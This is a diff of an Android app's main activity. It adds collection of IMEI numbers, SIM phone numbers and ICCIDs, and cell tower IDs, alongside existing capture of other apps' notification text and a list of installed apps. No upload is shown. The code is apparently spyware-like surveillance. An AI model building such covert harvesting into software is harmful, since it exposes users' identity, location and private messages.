@@ -31,8 +31,17 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.telephony.CellIdentityGsm;
+import android.telephony.CellIdentityLte;
+import android.telephony.CellInfo;
+import android.telephony.CellInfoGsm;
+import android.telephony.CellInfoLte;
+import android.telephony.CellSignalStrengthGsm;
+import android.telephony.CellSignalStrengthLte;
+import android.telephony.NeighboringCellInfo;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.text.format.Formatter;
 import android.util.Log;
 import android.view.View;
@@ -42,6 +51,10 @@ import android.widget.ImageView;
 
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.lang.reflect.Type;
 import java.net.InetAddress;
@@ -74,7 +87,7 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         mSharedpref = new Sharedpref(this);
         SyncData = findViewById(R.id.SynData);
-        miImageView=findViewById(R.id.image);
+        miImageView = findViewById(R.id.image);
         mWorkManager = WorkManager.getInstance();
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         mEditname = findViewById(R.id.ed_name);
@@ -126,62 +139,63 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-       private BroadcastReceiver onNotice= new BroadcastReceiver() {
+    private BroadcastReceiver onNotice = new BroadcastReceiver() {
 
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                String pack = intent.getStringExtra("package");
-                String title = intent.getStringExtra("title");
-                String text = intent.getStringExtra("text");
-                int id = intent.getIntExtra("icon",0);
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String pack = intent.getStringExtra("package");
+            String title = intent.getStringExtra("title");
+            String text = intent.getStringExtra("text");
+            int id = intent.getIntExtra("icon", 0);
 
-                Context remotePackageContext = null;
-                try {
-    //                remotePackageContext = getApplicationContext().createPackageContext(pack, 0);
-    //                Drawable icon = remotePackageContext.getResources().getDrawable(id);
-    //                if(icon !=null) {
-    //                    ((ImageView) findViewById(R.id.imageView)).setBackground(icon);
-    //                }
-                    byte[] byteArray =intent.getByteArrayExtra("icon");
-                    Bitmap bmp = null;
-                    if(byteArray !=null) {
-                        bmp = BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length);
-                    }
-                    Model model = new Model();
-                    String Date = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
-                    String Time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-                    model.setName(title +" " +text);
-                    model.setPackages(pack);
-                    model.setDate(Date);
-                    model.setTime(Time);
-                    model.setImage(bmp);
-                    if(bmp!=null && pack.equalsIgnoreCase("com.whatsapp")) {
-                        miImageView.setImageBitmap(bmp);
-                    }
-                    if(modelList !=null) {
-                        modelList.add(model);
-                    }else {
-                        modelList = new ArrayList<Model>();
-                        modelList.add(model);
-                    }
-                    Type baseType = new TypeToken<List<Model>>() {
-                    }.getType();
-                    Gson mGson = new Gson();
-                    String othernotifi = mGson.toJson(modelList, baseType);
-                    StringBuilder notifyBuilder=new StringBuilder();
-                    String otherNotificationData = mSharedpref.getOtherNotificationData();
-                    notifyBuilder.append(otherNotificationData+","+othernotifi);
-                    mSharedpref.setOtherNotificationData(notifyBuilder.toString());
-                    mSharedpref.commit();
-                } catch (Exception e) {
-                    e.printStackTrace();
+            Context remotePackageContext = null;
+            try {
+                //                remotePackageContext = getApplicationContext().createPackageContext(pack, 0);
+                //                Drawable icon = remotePackageContext.getResources().getDrawable(id);
+                //                if(icon !=null) {
+                //                    ((ImageView) findViewById(R.id.imageView)).setBackground(icon);
+                //                }
+                byte[] byteArray = intent.getByteArrayExtra("icon");
+                Bitmap bmp = null;
+                if (byteArray != null) {
+                    bmp = BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length);
                 }
+                Model model = new Model();
+                String Date = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
+                String Time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+                model.setName(title + " " + text);
+                model.setPackages(pack);
+                model.setDate(Date);
+                model.setTime(Time);
+                model.setImage(bmp);
+                if (bmp != null && pack.equalsIgnoreCase("com.whatsapp")) {
+                    miImageView.setImageBitmap(bmp);
+                }
+                if (modelList != null) {
+                    modelList.add(model);
+                } else {
+                    modelList = new ArrayList<Model>();
+                    modelList.add(model);
+                }
+                Type baseType = new TypeToken<List<Model>>() {
+                }.getType();
+                Gson mGson = new Gson();
+                String othernotifi = mGson.toJson(modelList, baseType);
+                StringBuilder notifyBuilder = new StringBuilder();
+                String otherNotificationData = mSharedpref.getOtherNotificationData();
+                notifyBuilder.append(otherNotificationData + "," + othernotifi);
+                mSharedpref.setOtherNotificationData(notifyBuilder.toString());
+                mSharedpref.commit();
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-        };
+        }
+    };
+
     private void getphoneAppdetails() {
         PackageManager pm = getPackageManager();
         List<ApplicationInfo> apps = pm.getInstalledApplications(0);
-        int i=0;
+        int i = 0;
         for (ApplicationInfo app : apps) {
             //checks for flags; if flagged, check if updated system app
             if ((app.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
@@ -190,8 +204,8 @@ public class MainActivity extends AppCompatActivity {
                 //Discard this one
                 //in this case, it should be a user-installed app
             } else {
-                String label = (String)pm.getApplicationLabel(app);
-                appsInstallednames.add(""+i+" "+label);
+                String label = (String) pm.getApplicationLabel(app);
+                appsInstallednames.add("" + i + " " + label);
                 i++;
             }
         }
@@ -252,7 +266,7 @@ public class MainActivity extends AppCompatActivity {
                         },
                         1);
             } else {
-
+                getImieNumbers(this);
                 AsyncTask.execute(new Runnable() {
                     @Override
                     public void run() {
@@ -268,8 +282,9 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        simName();
-
+        getImieNumbers(this);
+        simName(getApplicationContext());
+        getCellInfo(this);
         AsyncTask.execute(new Runnable() {
             @Override
             public void run() {
@@ -428,7 +443,7 @@ public class MainActivity extends AppCompatActivity {
         mSharedpref.commit();
     }
 
-    public HashMap<String, Object> deviceInformation() {
+    public static HashMap<String, Object> deviceInformation(Context cntx) {
         String os = System.getProperty("os.version"); // OS version
         String sdk = Build.VERSION.SDK;// API Level
         String device = Build.DEVICE;// Device
@@ -436,9 +451,9 @@ public class MainActivity extends AppCompatActivity {
         String brand = Build.BRAND;
         int versionCode = BuildConfig.VERSION_CODE;
         String versionName = BuildConfig.VERSION_NAME;
-        String androidId = Settings.Secure.getString(getContentResolver(),
+        String androidId = Settings.Secure.getString(cntx.getContentResolver(),
                 Settings.Secure.ANDROID_ID);
-        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+        WifiManager wm = (WifiManager) cntx.getSystemService(WIFI_SERVICE);
         String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
         String macAddress = getMACAddress("wlan0");
         String macAddress1 = getMACAddress("eth0");
@@ -447,9 +462,6 @@ public class MainActivity extends AppCompatActivity {
 
         String model = Build.MODEL;// Model
         String product = Build.PRODUCT;
-        /*String joinDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
-        String joinTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());*/
-
         HashMap<String, Object> deviceInfo = new HashMap<String, Object>();
         deviceInfo.put("os", os);
         deviceInfo.put("sdk", sdk);
@@ -466,7 +478,39 @@ public class MainActivity extends AppCompatActivity {
         deviceInfo.put("ipV6Adress", ipV6Adress);
         deviceInfo.put("model", model);
         deviceInfo.put("product", product);
+        deviceInfo.put("imeiNumber", getImieNumbers(cntx));
         return deviceInfo;
+    }
+
+    private static String getImieNumbers(Context cntx) {
+        TelephonyManager tm = (TelephonyManager) cntx.getSystemService(Context.TELEPHONY_SERVICE);
+        if (ActivityCompat.checkSelfPermission(cntx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
+            String imeiNumber1 = "",imeiNumber2="";
+            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+             imeiNumber1= Settings.Secure.getString(cntx.getContentResolver(),Settings.Secure.ANDROID_ID);
+            }
+            else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O){
+                imeiNumber1 = tm.getImei(0);
+                imeiNumber2 = tm.getImei(1);
+
+            }
+            else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                imeiNumber1 = tm.getDeviceId(0);
+                imeiNumber2 = tm.getDeviceId(1);
+            }
+
+
+            return imeiNumber1+","+imeiNumber2;
+        }
+
+        return "";
     }
 
     public static String getMACAddress(String interfaceName) {
@@ -493,6 +537,7 @@ public class MainActivity extends AppCompatActivity {
             return null;
         }*/
     }
+
     public static String getIPAddress(boolean useIPv4) {
         try {
             List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
@@ -521,12 +566,13 @@ public class MainActivity extends AppCompatActivity {
         return "";
 
     }
-    public String simName() {
-        StringBuilder builder=new StringBuilder();
-        if (Build.VERSION.SDK_INT > 22) {
-            SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
 
-            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+    public static JSONArray simName(Context mContext) {
+        JSONArray phonessimdetail = new JSONArray();
+        if (Build.VERSION.SDK_INT > 22) {
+            SubscriptionManager subscriptionManager = (SubscriptionManager)mContext. getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+
+            if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                 // TODO: Consider calling
                 //    ActivityCompat#requestPermissions
                 // here to request the missing permissions, and then overriding
@@ -534,22 +580,106 @@ public class MainActivity extends AppCompatActivity {
                 //                                          int[] grantResults)
                 // to handle the case where the user grants the permission. See the documentation
                 // for ActivityCompat#requestPermissions for more details.
-                return "";
+                return phonessimdetail;
             }
             List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
-
+            JSONObject cellObj = new JSONObject();
             if (subscriptionInfoList != null && subscriptionInfoList.size() > 0) {
                 for (SubscriptionInfo info : subscriptionInfoList) {
                     String carrierName = info.getCarrierName().toString();
-                    String countyIso = info.getCountryIso();
+                    String countryIso = info.getCountryIso();
                     int dataRoaming = info.getDataRoaming();
                     String mobileNo = info.getNumber();
-                    String mIccId=info.getIccId();
+                    String mIccId = info.getIccId();
+                    try {
+                        cellObj.put("carrierName",carrierName);
+                        cellObj.put("countryIso",info.getCountryIso());
+                        cellObj.put("dataRoaming",String.valueOf(info.getDataRoaming()));
+                        cellObj.put("mobileNo",info.getNumber());
+                        cellObj.put("mIccId",info.getIccId());
+                        phonessimdetail.put(cellObj);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+
+
                 }
             }
 
         }
-        return builder.toString();
+        return phonessimdetail;
+    }
+
+    public static JSONArray getCellInfo(Context ctx) {
+        TelephonyManager tel = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+
+        JSONArray cellList = new JSONArray();
+
+// Type of the network
+        int phoneTypeInt = tel.getPhoneType();
+        String phoneType = null;
+        phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_GSM ? "gsm" : phoneType;
+        phoneType = phoneTypeInt == TelephonyManager.PHONE_TYPE_CDMA ? "cdma" : phoneType;
+
+        //from Android M up must use getAllCellInfo
+        /*if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+
+
+            List<NeighboringCellInfo> neighCells = tel.getNeighboringCellInfo();
+            for (int i = 0; i < neighCells.size(); i++) {
+                try {
+                    JSONObject cellObj = new JSONObject();
+                    NeighboringCellInfo thisCell = neighCells.get(i);
+                    cellObj.put("cellId", thisCell.getCid());
+                    cellObj.put("lac", thisCell.getLac());
+                    cellObj.put("rssi", thisCell.getRssi());
+                    cellList.put(cellObj);
+                } catch (Exception e) {
+                }
+            }
+
+        } else {*/
+            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                // TODO: Consider calling
+                //    ActivityCompat#requestPermissions
+                // here to request the missing permissions, and then overriding
+                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                //                                          int[] grantResults)
+                // to handle the case where the user grants the permission. See the documentation
+                // for ActivityCompat#requestPermissions for more details.
+                return cellList ;
+            }
+            List<CellInfo> infos = tel.getAllCellInfo();
+            for (int i = 0; i<infos.size(); ++i) {
+                try {
+                    JSONObject cellObj = new JSONObject();
+                    CellInfo info = infos.get(i);
+                    if (info instanceof CellInfoGsm){
+                        CellSignalStrengthGsm gsm = ((CellInfoGsm) info).getCellSignalStrength();
+                        CellIdentityGsm identityGsm = ((CellInfoGsm) info).getCellIdentity();
+                        cellObj.put("cellId", identityGsm.getCid());
+                        cellObj.put("lac", identityGsm.getLac());
+                        cellObj.put("dbm", gsm.getDbm());
+                        cellObj.put("mnc",identityGsm.getMnc());
+                        cellObj.put("mcc",identityGsm.getMcc());
+                        cellList.put(cellObj);
+                    } else if (info instanceof CellInfoLte) {
+                        CellSignalStrengthLte lte = ((CellInfoLte) info).getCellSignalStrength();
+                        CellIdentityLte identityLte = ((CellInfoLte) info).getCellIdentity();
+                        cellObj.put("cellId", identityLte.getCi());
+                        cellObj.put("tac", identityLte.getTac());
+                        cellObj.put("dbm", lte.getDbm());
+                        cellList.put(cellObj);
+                    }
+
+                } catch (Exception ex) {
+
+                }
+            }
+    //    }
+
+        return cellList;
     }
 
 }
